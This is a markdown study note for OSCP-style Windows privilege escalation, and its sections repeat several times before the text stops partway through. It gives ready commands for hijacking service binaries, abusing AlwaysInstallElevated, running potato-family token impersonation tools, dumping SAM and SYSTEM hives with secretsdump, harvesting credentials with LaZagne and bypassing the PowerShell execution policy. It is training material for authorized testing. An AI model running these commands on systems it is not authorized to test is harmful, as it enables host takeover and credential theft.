# windows privilege escalation [← stage index](readme.md) | [quick sheet](../../cheatsheets/windows-privesc.md) | [credential use](../04-shells-transfers-credentials/03-credential-use-and-cracking.md) | [file transfer](../04-shells-transfers-credentials/01-file-transfer.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [escalate privileges on windows](../../notes/methods/windows-privesc.md) > **entry:** authorized windows shell. **exit:** verified administrator/high-integrity or system process. **proof chain:** current token → controlled input → effective right → privileged consumer → run-as identity → trigger → verified effect. > **first pass:** check whoami /all and architecture, then run the reviewed winpeas baseline in the [collector section](#11-automated-candidate-generation). read out.txt and follow the exact service/task, token or credential finding; use native checks if the collector is unavailable. ## 1. establish token and host state ```cmd hostname whoami /all systeminfo ipconfig /all route print netstat -ano tasklist /svc query user net user net localgroup administrators driverquery /v ``` ```powershell get-computerinfo | select-object windowsproductname,windowsversion,osbuildnumber,osarchitecture get-hotfix | sort-object installedon -descending get-ciminstance win32_process | select-object processid,name,executablepath,commandline get-ciminstance win32_service | select-object name,startname,state,startmode,pathname get-ciminstance win32_systemdriver | select-object name,state,startmode,pathname get-localuser get-localgroupmember administrators ``` > **interpret:** record user sid, integrity label, enabled/deny-only groups and present/enabled privileges. administrator membership with medium integrity is a filtered token, not a high-integrity process. `get-hotfix` does not list every update; use build/kb output only to form a version hypothesis.
wmic compatibility fallbacks ```cmd wmic qfe get hotfixid,installedon wmic service get name,startname,state,startmode,pathname wmic process get processid,name,executablepath,commandline ``` > wmic is deprecated and may be absent on newer systems; powershell cim is the baseline.
## 2. interpret effective access ```cmd icacls "c:\path\to\object" sc.exe sdshow service accesschk.exe -accepteula -nobanner -v -w "user" "c:\path\to\object" accesschk.exe -accepteula -nobanner -v -w -c "user" service ``` `icacls` common rights: `f` full, `m` modify, `rx` read/execute, `r` read, `w` write, `d` delete. common inheritance markers: `i`, `oi`, `ci`, `io`, `np`. > file, directory, registry, service-object, task and process permissions are separate. check whether the ace applies to the current user or an enabled group and grants the exact required operation. mandatory integrity control can still block a lower-integrity write. ## 3. hunt credentials and configuration ### stored credentials and powershell trails ```cmd cmdkey /list vaultcmd /list vaultcmd /listcreds:"windows credentials" /all ``` ```powershell $history = (get-psreadlineoption).historysavepath $history get-content -literalpath $history -erroraction silentlycontinue get-itemproperty 'hklm:\software\policies\microsoft\windows\powershell\transcription' -erroraction silentlycontinue get-itemproperty 'hkcu:\software\policies\microsoft\windows\powershell\transcription' -erroraction silentlycontinue get-winevent -logname 'microsoft-windows-powershell/operational' -erroraction silentlycontinue | where-object id -in 4103,4104 | select-object -first 50 timecreated,id,message ``` > a `cmdkey` entry is target/context-bound and does not reveal a password. dpapi-protected data needs the protecting user/machine context and keys. `clear-history` does not necessarily clear psreadline's saved file.
targeted application/file/registry search ```cmd reg query "hklm\software\microsoft\windows nt\currentversion\winlogon" /v defaultusername reg query "hklm\software\microsoft\windows nt\currentversion\winlogon" /v defaultpassword reg query "hkcu\software\simontatham\putty\sessions" /s dir /s /b c:\windows\panther\*unattend*.xml c:\windows\system32\sysprep\*.xml 2>nul dir /s /b c:\users\*.kdbx c:\users\*.rdp c:\users\id_rsa c:\users\*.ppk 2>nul ``` ```powershell get-childitem c:\inetpub,c:\programdata,c:\users -recurse -file -erroraction silentlycontinue | where-object { $_.extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } | select-string -pattern 'password|passwd|secret|token|connectionstring|user id=' -casesensitive:$false ``` > search from observed applications first. classify every value by identity, format, scope and compatible service, then use the credential procedure.
saved credential consumer ```cmd runas /savecred /user:domain\user cmd.exe ``` > use only when `cmdkey`/context supports that identity and logon type. `runas` does not inherently bypass uac; verify the resulting token with `whoami /all`.
lazagne — recover application credentials in the current user's context use a reviewed windows build after identifying the current user and installed applications. start with the relevant family; run broader collection only when useful. user-protected stores depend on that user's profile/decryption context; system-protected stores can need an elevated token. ```cmd rem browser-store leads for the current user lazagne.exe browsers rem broader recovery, with a local text report lazagne.exe all -on ``` > **read:** preserve the reported application/account/source with each recovered value. test a matching service using the credential procedure; a recovered application password is not automatically a domain password. empty output can mean no supported store, inaccessible profile or failed decryption. follow manual history/config/vault checks instead of assuming there are no credentials. [lazagne upstream](https://github.com/alessandroz/lazagne).
## 4. service control and executed objects ### inventory and inspect ```powershell get-ciminstance win32_service | select-object name,startname,state,startmode,pathname ``` ```cmd sc.exe qc service sc.exe sdshow service icacls "c:\path\to\service.exe" icacls "c:\path\to" accesschk.exe -accepteula -nobanner -v -w -c "user" service accesschk.exe -accepteula -nobanner -v -w "user" "c:\path\to\service.exe" ``` > **need:** control of service config, exact binary/script, searched prefix, dll/config/plugin, or relevant dacl; higher `service_start_name`; and a start/restart/boot trigger. in powershell use `sc.exe`, because bare `sc` can resolve to `set-content`. ### modifiable service configuration preserve `binary_path_name`, account and start mode first: ```cmd sc.exe qc service sc.exe config service binpath= "c:\windows\temp\payload_exe" sc.exe stop service sc.exe start service ``` restore: ```cmd sc.exe config service binpath= "original_binary_path" ``` > `service_change_config` controls `binpath`; start/stop are separate rights. the space after `binpath=` is required. error 1053 may mean a non-service payload ran but did not answer the service control manager; verify the intended effect.
writable service binary or replaceable parent ```cmd sc.exe qc service icacls "c:\path\to\service.exe" icacls "c:\path\to" copy /y "c:\path\to\service.exe" "c:\windows\temp\service.exe.backup" copy /y "c:\windows\temp\payload_exe" "c:\path\to\service.exe" sc.exe stop service sc.exe start service ``` > a parent with delete/create rights can permit replacement even when the file is not directly writable. confirm architecture, file locks, recovery copy and exact trigger.
## 5. unquoted service paths ```powershell get-ciminstance win32_service | where-object { $_.pathname -match '\s' -and $_.pathname -notmatch '^\s*"' } | select-object name,startname,state,startmode,pathname ``` for `c:\program files\vendor app\service.exe -d`, check every attempted prefix: ```cmd icacls c:\ icacls "c:\program files" icacls "c:\program files\vendor app" sc.exe qc service ``` > **confirmed only if:** path contains spaces and is unquoted; an earlier attempted executable such as `c:\program.exe` or `c:\program files\vendor.exe` is absent and creatable; service runs higher; trigger exists. a listed unquoted path alone is a false positive. ## 6. dll/config/helper search hijacking confirm: 1. exact dll/helper/config name and architecture; 2. privileged process actually requests it; 3. selected attacker-writable location precedes the legitimate resolution; 4. payload preserves required exports/behavior where necessary; 5. reliable trigger exists. ```cmd icacls "c:\path\to\application" sc.exe qc service reg query "hklm\system\currentcontrolset\control\session manager\knowndlls" reg query "hklm\system\currentcontrolset\control\session manager" /v safedllsearchmode ``` > modern dll resolution can apply redirection, api sets, side-by-side manifests, loaded modules, knowndlls, package dependencies and application-specific search flags before ordinary directories. safe dll search mode is enabled by default. in a suitable lab, procmon filters for the process, `createfile`, `.dll`, and `name not found` provide decisive runtime evidence; low-privilege remote use may be unavailable. ## 7. scheduled tasks and autostarts ### scheduled tasks ```cmd schtasks /query /fo list /v schtasks /query /tn "\folder\task" /xml ``` ```powershell get-scheduledtask | foreach-object { $t = $_ [pscustomobject]@{ taskpath=$t.taskpath; taskname=$t.taskname userid=$t.principal.userid; runlevel=$t.principal.runlevel actions=($t.actions | foreach-object { "$($_.execute) $($_.arguments) [wd=$($_.workingdirectory)]" }) -join '; ' } } ``` ```cmd icacls "c:\path\to\task-script.ps1" icacls "c:\path\to" schtasks /run /tn "\folder\task" ``` > prove action, arguments, working directory, principal, actual trigger and effective acl. `runlevel highest` means the configured principal's highest available token, not system. `/run` success means the request was accepted; verify process/effect and last-run result.
run keys and startup consumers ```cmd reg query hklm\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\run dir "c:\programdata\microsoft\windows\start menu\programs\startup" dir "%appdata%\microsoft\windows\start menu\programs\startup" ``` > need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. a writable path directory matters only when a privileged consumer invokes an unqualified executable through that effective path.
## 8. alwaysinstallelevated and uac context ```cmd reg query hklm\software\policies\microsoft\windows\installer /v alwaysinstallelevated reg query hkcu\software\policies\microsoft\windows\installer /v alwaysinstallelevated ``` both values must be `0x1`: ```cmd msiexec.exe /quiet /qn /i c:\path\to\payload.msi ``` > one key or a zero value disproves the route. this is an unsafe installer policy, not a universal uac bypass. ```cmd whoami /groups reg query hklm\software\microsoft\windows\currentversion\policies\system /v enablelua reg query hklm\software\microsoft\windows\currentversion\policies\system /v consentpromptbehavioradmin ``` > a uac bypass normally elevates an already-administrative filtered token. build/policy-specific bypasses are not a baseline path for a standard user. ## 9. token privilege routes ```cmd whoami /priv ``` | privilege | required next proof | | --- | --- | | `seimpersonateprivilege` | compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation | | `seassignprimarytokenprivilege` | useful primary token plus process/quota requirements | | `sebackupprivilege` | enabled privilege, backup-aware read and useful protected data | | `serestoreprivilege` | restore-aware write plus privileged consumer/trigger | | `sedebugprivilege` | usable target process and no protected-process barrier | | `seloaddriverprivilege` | compatible signed/loadable driver and stable exploit path | | `setakeownershipprivilege` | ownership change, then dacl/content control and consumer |
impersonation-tool variants ```cmd printspoofer64.exe -i -c "cmd.exe" ``` ```cmd godpotato-net4.exe -cmd "cmd.exe /c whoami > c:\windows\temp\token-proof.txt" ``` > choose by os build, architecture, runtime and available trigger. a privilege name alone does not select a working “potato.” success is a system process/effect followed by `whoami /all`; connection/token/process errors route back to prerequisites.
backup privilege to local credential material ```cmd reg save hklm\sam c:\windows\temp\sam.hive reg save hklm\system c:\windows\temp\system.hive ``` ```bash impacket-secretsdump -sam sam.hive -system system.hive local ``` > use the matched hive pair. output is local credential material, not automatic system/domain/remote authorization; classify and validate it through the credential procedure.
## 10. application, driver and kernel candidates ```powershell get-itemproperty 'hklm:\software\microsoft\windows\currentversion\uninstall\*', 'hklm:\software\wow6432node\microsoft\windows\currentversion\uninstall\*' -erroraction silentlycontinue | select-object displayname,displayversion,publisher,installlocation ``` ```cmd systeminfo driverquery /v ``` > prefer deterministic credential/permission/configuration paths. then verify exact privileged application or driver version/configuration. use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. avoid `win32_product`; it is slow and can trigger msi repair. ## 11. automated candidate generation ```cmd winpeasx64.exe log seatbelt.exe -group=system -outputfile="c:\windows\temp\seatbelt-system.txt" seatbelt.exe -group=user -q -outputfile="c:\windows\temp\seatbelt-user.json" ``` ```powershell powershell.exe -executionpolicy bypass -command ". .\privesccheck.ps1; invoke-privesccheck -report txt,html" import-module .\powerup.ps1 invoke-allchecks ``` > winpeas is broad; seatbelt is a targeted survey and publishes source rather than official binaries; privesccheck evaluates the current token and skips some checks when elevated; powerup is useful but its upstream repository was archived. av/script-policy failure is a tooling limitation—use native checks. convert every highlight into: ```text candidate | current token | controlled input | effective right | consumer | run-as | trigger | expected effect | status ``` ## 12. failure router | failure | next action | | --- | --- | | service config `access is denied` | validate service dacl/effective token; inspect binary/dll/config alternatives | | can modify but cannot restart | find reliable boot/logon/service dependency trigger or choose another path | | service error 1053 | check bounded effect, then restore; payload may not implement the service protocol | | unquoted path but no creatable prefix | disprove the route | | dll not loaded | recheck actual request, knowndll/sxs/loaded module, search order, bitness and trigger | | task accepted but no effect | check action, conditions, working directory, lasttaskresult/history and process lifetime | | privilege tool fails | recheck enabled token state, build, architecture/runtime and trigger-specific prerequisite | | hashes but no higher session | return to credential classification and host/service authorization | | suggester lists cve | verify exact component/build/patch/config and exploit source before use | | enumerator blocked | run the relevant native branch; do not infer no findings | ## 13. verify, re-enumerate and preserve evidence ```cmd whoami /all hostname ipconfig /all ``` after a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. preserve the command, relevant output, trigger and restoration step. for exam use, recheck the current offsec guide: windows full-privilege evidence requires system, administrator or an account with administrator privileges, and ai/llm use is prohibited during the exam and report phase. ## jaws — powershell enumeration when the compiled helper is unsuitable use a reviewed jaws script when its powershell-based checks fit the current host/runtime. it is an alternative survey, not proof that every current windows configuration is covered. ```cmd powershell.exe -executionpolicy bypass -file .\jaws-enum.ps1 -outputfilename jaws-enum.txt ``` read: turn a named service, path or credential finding into its exact native check (`sc.exe qc`, `sc.exe sdshow`, `icacls`, task xml, or the file read). policy or language restrictions can still prevent the script from running. the process-scope flag does not override an enforced policy/control layer; use the manual checks already listed here. sources: [upstream 1](https://github.com/411hall/jaws). ## legacy impersonation helpers — select by os build and trigger use the current godpotato/printspoofer workflow first when its conditions fit. older juicypotato-family recipes depend on specific com/dcom/rpc behavior; an enabled token privilege alone is not the complete condition. ```cmd rem legacy juicypotato: requires a working clsid and supported windows build juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c clsid -a "/c whoami > c:\windows\temp\identity-check.txt" rem separate efs-triggered helper, if its documented prerequisites fit sharpefspotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami > c:\windows\temp\identity-check.txt" type c:\windows\temp\identity-check.txt ``` read: verify the exact resulting token/identity and effect. clsid/rpc/trigger errors can mean an incompatible build, service state or blocked primitive—not a wrong password. original juicypotato is a legacy option and is not a universal modern-windows escalation. inspect each helper's local help/version; do not interchange flags across juicypotatong, godpotato and sharpefspotato. sources: [upstream 1](https://github.com/ohpe/juicy-potato) · [upstream 2](https://github.com/bugch3ck/sharpefspotato). ## accesschk — verify the exact service, file or registry permission use after winpeas, privesccheck or a manual check identifies a candidate. query the current identity and the exact object; a writable service binary and service-configuration rights are different paths. ```cmd whoami accesschk.exe -nobanner -v -c "domain\user" service accesschk.exe -nobanner -v "domain\user" "c:\path\to\program.exe" accesschk.exe -nobanner -v -k "domain\user" "hklm\system\currentcontrolset\services\service" :: broader candidate discovery; retain errors rather than suppressing them accesschk.exe -nobanner -w -v -c "domain\user" * ``` read: `service_change_config`, `write_dac`, file modification and registry value modification enable different operations. next inspect `sc.exe qc service`, executable/parent acls, service identity and a permitted restart/trigger. a write result alone does not establish system execution. empty write-filtered output is not a complete permission inventory; inspect the exact object without `-w` and check errors. use the existing `sc.exe sdshow`, `icacls` and powershell acl checks if accesschk is unavailable. sources: [upstream 1](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk). ## sources - supplied pen-200, chapter 17, pp494-549 - [offsec oscp+ body of knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-oscp-body-of-knowledge) - [offsec oscp+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-oscp-exam-guide) - [getsh windows privilege escalation](https://lizajose.github.io/getsh/privesc?system=windows), source snapshot [`e1f62dd`](https://github.com/lizajose/getsh/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [hexdump windows module](https://github.com/leonardoe95/oscp/tree/main/modules/windows) - [microsoft access tokens](https://learn.microsoft.com/windows/win32/secauthz/access-tokens) - [microsoft mandatory integrity control](https://learn.microsoft.com/windows/win32/secauthz/mandatory-integrity-control) - [microsoft service security and access rights](https://learn.microsoft.com/windows/win32/services/service-security-and-access-rights) - [microsoft dll search order](https://learn.microsoft.com/windows/win32/dlls/dynamic-link-library-search-order) - [microsoft alwaysinstallelevated policy](https://learn.microsoft.com/windows/client-management/mdm/policy-csp-applicationmanagement#msialwaysinstallwithelevatedprivileges) - [microsoft accesschk](https://learn.microsoft.com/sysinternals/downloads/accesschk) - [privesccheck](https://github.com/itm4n/privesccheck), [seatbelt](https://github.com/ghostpack/seatbelt), [peass-ng](https://github.com/peass-ng/peass-ng) - [printspoofer research](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), [godpotato](https://github.com/beichendream/godpotato)

sections.title: 4. Service control and executed objects
sections.search:
## 4. service control and executed objects ### inventory and inspect ```powershell get-ciminstance win32_service | select-object name,startname,state,startmode,pathname ``` ```cmd sc.exe qc service sc.exe sdshow service icacls "c:\path\to\service.exe" icacls "c:\path\to" accesschk.exe -accepteula -nobanner -v -w -c "user" service accesschk.exe -accepteula -nobanner -v -w "user" "c:\path\to\service.exe" ``` > **need:** control of service config, exact binary/script, searched prefix, dll/config/plugin, or relevant dacl; higher `service_start_name`; and a start/restart/boot trigger. in powershell use `sc.exe`, because bare `sc` can resolve to `set-content`. ### modifiable service configuration preserve `binary_path_name`, account and start mode first: ```cmd sc.exe qc service sc.exe config service binpath= "c:\windows\temp\payload_exe" sc.exe stop service sc.exe start service ``` restore: ```cmd sc.exe config service binpath= "original_binary_path" ``` > `service_change_config` controls `binpath`; start/stop are separate rights. the space after `binpath=` is required. error 1053 may mean a non-service payload ran but did not answer the service control manager; verify the intended effect.
writable service binary or replaceable parent ```cmd sc.exe qc service icacls "c:\path\to\service.exe" icacls "c:\path\to" copy /y "c:\path\to\service.exe" "c:\windows\temp\service.exe.backup" copy /y "c:\windows\temp\payload_exe" "c:\path\to\service.exe" sc.exe stop service sc.exe start service ``` > a parent with delete/create rights can permit replacement even when the file is not directly writable. confirm architecture, file locks, recovery copy and exact trigger.

sections.title: 5. Unquoted service paths
sections.search:
## 5. unquoted service paths

```powershell
get-ciminstance win32_service |
  where-object { $_.pathname -match '\s' -and $_.pathname -notmatch '^\s*"' } |
  select-object name,startname,state,startmode,pathname
```

for `c:\program files\vendor app\service.exe -d`, check every attempted prefix:

```cmd
icacls c:\
icacls "c:\program files"
icacls "c:\program files\vendor app"
sc.exe qc service
```

> **confirmed only if:** path contains spaces and is unquoted; an earlier attempted executable such as `c:\program.exe` or `c:\program files\vendor.exe` is absent and creatable; service runs higher; trigger exists. a listed unquoted path alone is a false positive.

sections.title: 6. DLL/config/helper search hijacking
sections.search:
## 6. dll/config/helper search hijacking

confirm:

1. exact dll/helper/config name and architecture;
2. privileged process actually requests it;
3. selected attacker-writable location precedes the legitimate resolution;
4. payload preserves required exports/behavior where necessary;
5. reliable trigger exists.

```cmd
icacls "c:\path\to\application"
sc.exe qc service
reg query "hklm\system\currentcontrolset\control\session manager\knowndlls"
reg query "hklm\system\currentcontrolset\control\session manager" /v safedllsearchmode
```

> modern dll resolution can apply redirection, api sets, side-by-side manifests, loaded modules, knowndlls, package dependencies and application-specific search flags before ordinary directories. safe dll search mode is enabled by default. in a suitable lab, procmon filters for the process, `createfile`, `.dll`, and `name not found` provide decisive runtime evidence; low-privilege remote use may be unavailable.

sections.title: 7. Scheduled tasks and autostarts
sections.search:
## 7. scheduled tasks and autostarts ### scheduled tasks ```cmd schtasks /query /fo list /v schtasks /query /tn "\folder\task" /xml ``` ```powershell get-scheduledtask | foreach-object { $t = $_ [pscustomobject]@{ taskpath=$t.taskpath; taskname=$t.taskname userid=$t.principal.userid; runlevel=$t.principal.runlevel actions=($t.actions | foreach-object { "$($_.execute) $($_.arguments) [wd=$($_.workingdirectory)]" }) -join '; ' } } ``` ```cmd icacls "c:\path\to\task-script.ps1" icacls "c:\path\to" schtasks /run /tn "\folder\task" ``` > prove action, arguments, working directory, principal, actual trigger and effective acl. `runlevel highest` means the configured principal's highest available token, not system. `/run` success means the request was accepted; verify process/effect and last-run result.
run keys and startup consumers ```cmd reg query hklm\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\run dir "c:\programdata\microsoft\windows\start menu\programs\startup" dir "%appdata%\microsoft\windows\start menu\programs\startup" ``` > need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. a writable path directory matters only when a privileged consumer invokes an unqualified executable through that effective path.

sections.title: 8. AlwaysInstallElevated and UAC context
sections.search:
## 8. alwaysinstallelevated and uac context

```cmd
reg query hklm\software\policies\microsoft\windows\installer /v alwaysinstallelevated
reg query hkcu\software\policies\microsoft\windows\installer /v alwaysinstallelevated
```

both values must be `0x1`:

```cmd
msiexec.exe /quiet /qn /i c:\path\to\payload.msi
```

> one key or a zero value disproves the route. this is an unsafe installer policy, not a universal uac bypass.

```cmd
whoami /groups
reg query hklm\software\microsoft\windows\currentversion\policies\system /v enablelua
reg query hklm\software\microsoft\windows\currentversion\policies\system /v consentpromptbehavioradmin
```

> a uac bypass normally elevates an already-administrative filtered token. build/policy-specific bypasses are not a baseline path for a standard user.

sections.title: 9. Token privilege routes
sections.search:
## 9. token privilege routes ```cmd whoami /priv ``` | privilege | required next proof | | --- | --- | | `seimpersonateprivilege` | compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation | | `seassignprimarytokenprivilege` | useful primary token plus process/quota requirements | | `sebackupprivilege` | enabled privilege, backup-aware read and useful protected data | | `serestoreprivilege` | restore-aware write plus privileged consumer/trigger | | `sedebugprivilege` | usable target process and no protected-process barrier | | `seloaddriverprivilege` | compatible signed/loadable driver and stable exploit path | | `setakeownershipprivilege` | ownership change, then dacl/content control and consumer |
impersonation-tool variants ```cmd printspoofer64.exe -i -c "cmd.exe" ``` ```cmd godpotato-net4.exe -cmd "cmd.exe /c whoami > c:\windows\temp\token-proof.txt" ``` > choose by os build, architecture, runtime and available trigger. a privilege name alone does not select a working “potato.” success is a system process/effect followed by `whoami /all`; connection/token/process errors route back to prerequisites.
backup privilege to local credential material ```cmd reg save hklm\sam c:\windows\temp\sam.hive reg save hklm\system c:\windows\temp\system.hive ``` ```bash impacket-secretsdump -sam sam.hive -system system.hive local ``` > use the matched hive pair. output is local credential material, not automatic system/domain/remote authorization; classify and validate it through the credential procedure.

sections.title: 10. Application, driver and kernel candidates
sections.search:
## 10. application, driver and kernel candidates

```powershell
get-itemproperty 'hklm:\software\microsoft\windows\currentversion\uninstall\*',
                 'hklm:\software\wow6432node\microsoft\windows\currentversion\uninstall\*' -erroraction silentlycontinue |
  select-object displayname,displayversion,publisher,installlocation
```

```cmd
systeminfo
driverquery /v
```

> prefer deterministic credential/permission/configuration paths. then verify exact privileged application or driver version/configuration. use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. avoid `win32_product`; it is slow and can trigger msi repair.

sections.title: 11. Automated candidate generation
sections.search:
## 11. automated candidate generation

```cmd
winpeasx64.exe log
seatbelt.exe -group=system -outputfile="c:\windows\temp\seatbelt-system.txt"
seatbelt.exe -group=user -q -outputfile="c:\windows\temp\seatbelt-user.json"
```

```powershell
powershell.exe -executionpolicy bypass -command ". .\privesccheck.ps1; invoke-privesccheck -report txt,html"
import-module .\powerup.ps1
invoke-allchecks
```

> winpeas is broad; seatbelt is a targeted survey and publishes source rather than official binaries; privesccheck evaluates the current token and skips some checks when elevated; powerup is useful but its upstream repository was archived. av/script-policy failure is a tooling limitation—use native checks.

convert every highlight into:

```text
candidate | current token | controlled input | effective right | consumer | run-as | trigger | expected effect | status
```

sections.title: 12. Failure router
sections.search:
## 12. failure router

| failure | next action |
| --- | --- |
| service config `access is denied` | validate service dacl/effective token; inspect binary/dll/config alternatives |
| can modify but cannot restart | find reliable boot/logon/service dependency trigger or choose another path |
| service error 1053 | check bounded effect, then restore; payload may not implement the service protocol |
| unquoted path but no creatable prefix | disprove the route |
| dll not loaded | recheck actual request, knowndll/sxs/loaded module, search order, bitness and trigger |
| task accepted but no effect | check action, conditions, working directory, lasttaskresult/history and process lifetime |
| privilege tool fails | recheck enabled token state, build, architecture/runtime and trigger-specific prerequisite |
| hashes but no higher session | return to credential classification and host/service authorization |
| suggester lists cve | verify exact component/build/patch/config and exploit source before use |
| enumerator blocked | run the relevant native branch; do not infer no findings |

sections.title: 13. Verify, re-enumerate and preserve evidence
sections.search:
## 13. verify, re-enumerate and preserve evidence

```cmd
whoami /all
hostname
ipconfig /all
```

after a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. preserve the command, relevant output, trigger and restoration step. for exam use, recheck the current offsec guide: windows full-privilege evidence requires system, administrator or an account with administrator privileges, and ai/llm use is prohibited during the exam and report phase.

sections.title: JAWS — PowerShell enumeration when the compiled helper is unsuitable
sections.search:
## jaws — powershell enumeration when the compiled helper is unsuitable

use a reviewed jaws script when its powershell-based checks fit the current host/runtime. it is an alternative survey, not proof that every current windows configuration is covered.

```cmd
powershell.exe -executionpolicy bypass -file .\jaws-enum.ps1 -outputfilename jaws-enum.txt
```

read: turn a named service, path or credential finding into its exact native check (`sc.exe qc`, `sc.exe sdshow`, `icacls`, task xml, or the file read). policy or language restrictions can still prevent the script from running. the process-scope flag does not override an enforced policy/control layer; use the manual checks already listed here.

sources: [upstream 1](https://github.com/411hall/jaws).

sections.title: Legacy impersonation helpers — select by OS build and trigger
sections.search:
## legacy impersonation helpers — select by os build and trigger

use the current godpotato/printspoofer workflow first when its conditions fit. older juicypotato-family recipes depend on specific com/dcom/rpc behavior; an enabled token privilege alone is not the complete condition.

```cmd
rem legacy juicypotato: requires a working clsid and supported windows build
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c clsid -a "/c whoami > c:\windows\temp\identity-check.txt"

rem separate efs-triggered helper, if its documented prerequisites fit
sharpefspotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami > c:\windows\temp\identity-check.txt"

type c:\windows\temp\identity-check.txt
```

read: verify the exact resulting token/identity and effect. clsid/rpc/trigger errors can mean an incompatible build, service state or blocked primitive—not a wrong password. original juicypotato is a legacy option and is not a universal modern-windows escalation. inspect each helper's local help/version; do not interchange flags across juicypotatong, godpotato and sharpefspotato.

sources: [upstream 1](https://github.com/ohpe/juicy-potato) · [upstream 2](https://github.com/bugch3ck/sharpefspotato).

sections.title: AccessChk — verify the exact service, file or registry permission
sections.search:
## accesschk — verify the exact service, file or registry permission

use after winpeas, privesccheck or a manual check identifies a candidate. query the current identity and the exact object; a writable service binary and service-configuration rights are different paths.

```cmd
whoami
accesschk.exe -nobanner -v -c "domain\user" service
accesschk.exe -nobanner -v "domain\user" "c:\path\to\program.exe"
accesschk.exe -nobanner -v -k "domain\user" "hklm\system\currentcontrolset\services\service"

:: broader candidate discovery; retain errors rather than suppressing them
accesschk.exe -nobanner -w -v -c "domain\user" *
```

read: `service_change_config`, `write_dac`, file modification and registry value modification enable different operations. next inspect `sc.exe qc service`, executable/parent acls, service identity and a permitted restart/trigger. a write result alone does not establish system execution. empty write-filtered output is not a complete permission inventory; inspect the exact object without `-w` and check errors. use the existing `sc.exe sdshow`, `icacls` and powershell acl checks if accesschk is unavailable.

sources: [upstream 1](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk).

Saved credential consumer ```cmd runas /savecred /user:DOMAIN\USER cmd.exe ``` > Use only when `cmdkey`/context supports that identity and logon type. `runas` does not inherently bypass UAC; verify the resulting token with `whoami /all`.
LaZagne — recover application credentials in the current user's context Use a reviewed Windows build after identifying the current user and installed applications. Start with the relevant family; run broader collection only when useful. User-protected stores depend on that user's profile/decryption context; system-protected stores can need an elevated token. ```cmd REM Browser-store leads for the current user laZagne.exe browsers REM Broader recovery, with a local text report laZagne.exe all -oN ``` > **Read:** preserve the reported application/account/source with each recovered value. Test a matching service using the credential procedure; a recovered application password is not automatically a domain password. Empty output can mean no supported store, inaccessible profile or failed decryption. Follow manual history/config/vault checks instead of assuming there are no credentials. [LaZagne upstream](https://github.com/AlessandroZ/LaZagne).
## 4. Service control and executed objects ### Inventory and inspect ```powershell Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName ``` ```cmd sc.exe qc SERVICE sc.exe sdshow SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\service.exe" ``` > **Need:** control of service config, exact binary/script, searched prefix, DLL/config/plugin, or relevant DACL; higher `SERVICE_START_NAME`; and a start/restart/boot trigger. In PowerShell use `sc.exe`, because bare `sc` can resolve to `Set-Content`. ### Modifiable service configuration Preserve `BINARY_PATH_NAME`, account and start mode first: ```cmd sc.exe qc SERVICE sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE" sc.exe stop SERVICE sc.exe start SERVICE ``` Restore: ```cmd sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH" ``` > `SERVICE_CHANGE_CONFIG` controls `binPath`; start/stop are separate rights. The space after `binPath=` is required. Error 1053 may mean a non-service payload ran but did not answer the Service Control Manager; verify the intended effect.
Writable service binary or replaceable parent ```cmd sc.exe qc SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup" copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe" sc.exe stop SERVICE sc.exe start SERVICE ``` > A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.
## 5. Unquoted service paths ```powershell Get-CimInstance Win32_Service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } | Select-Object Name,StartName,State,StartMode,PathName ``` For `C:\Program Files\Vendor App\service.exe -d`, check every attempted prefix: ```cmd icacls C:\ icacls "C:\Program Files" icacls "C:\Program Files\Vendor App" sc.exe qc SERVICE ``` > **Confirmed only if:** path contains spaces and is unquoted; an earlier attempted executable such as `C:\Program.exe` or `C:\Program Files\Vendor.exe` is absent and creatable; service runs higher; trigger exists. A listed unquoted path alone is a false positive. ## 6. DLL/config/helper search hijacking Confirm: 1. exact DLL/helper/config name and architecture; 2. privileged process actually requests it; 3. selected attacker-writable location precedes the legitimate resolution; 4. payload preserves required exports/behavior where necessary; 5. reliable trigger exists. ```cmd icacls "C:\Path\To\Application" sc.exe qc SERVICE reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode ``` > Modern DLL resolution can apply redirection, API sets, side-by-side manifests, loaded modules, KnownDLLs, package dependencies and application-specific search flags before ordinary directories. Safe DLL search mode is enabled by default. In a suitable lab, Procmon filters for the process, `CreateFile`, `.dll`, and `NAME NOT FOUND` provide decisive runtime evidence; low-privilege remote use may be unavailable. ## 7. Scheduled tasks and autostarts ### Scheduled tasks ```cmd schtasks /query /fo LIST /v schtasks /query /tn "\FOLDER\TASK" /xml ``` ```powershell 